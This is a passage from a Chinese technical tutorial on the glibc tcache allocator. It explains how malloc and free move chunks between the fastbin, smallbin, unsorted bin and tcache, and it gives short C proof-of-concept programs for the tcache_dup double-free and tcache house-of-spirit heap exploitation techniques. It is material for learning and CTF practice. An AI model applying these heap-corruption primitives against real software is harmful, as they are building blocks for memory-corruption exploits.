<code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 